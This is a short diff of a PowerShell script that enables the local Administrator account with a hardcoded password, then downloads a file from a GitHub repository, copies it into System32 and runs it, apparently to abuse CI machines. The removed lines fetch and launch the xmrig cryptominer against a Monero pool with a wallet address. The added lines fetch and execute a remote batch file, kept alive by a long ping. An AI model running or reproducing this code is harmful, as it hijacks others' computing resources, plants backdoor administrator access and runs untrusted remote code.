@@ -1,9 +1,8 @@
 Hosted File:
 Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "@rdpbyav321" -Force)
 Get-LocalUser -Name "Administrator" | Enable-LocalUser 
-Invoke-WebRequest https://raw.githubusercontent.com/robertreynolds2/mine/main/xmrig.zip -OutFile xmrig.zip
-tar xf xmrig.zip
-Copy xmrig.exe C:\Windows\System32
-cmd /c echo ./xmrig.exe -o gulf.moneroocean.stream:80 -u 49Wr4g6SVqiRabVyhk5zigZXR6bNXX8H5bhMUYiSTk1ijdhB2MBDQTedNuCj27NpFG53oWpaRq8hU1qHHHFevbCsQbCTXdN -p circleci -k -a rx/0 -t 4 -B >a.ps1
+Invoke-WebRequest https://raw.githubusercontent.com/robertreynolds2/mine/main/direct -OutFile direct.bat
+Copy direct.bat C:\Windows\System32
+cmd /c echo ./direct.bat >a.ps1
 cmd /c echo ping -n 99999999999999 10.10.10.10 >>a.ps1
 .\a.ps1
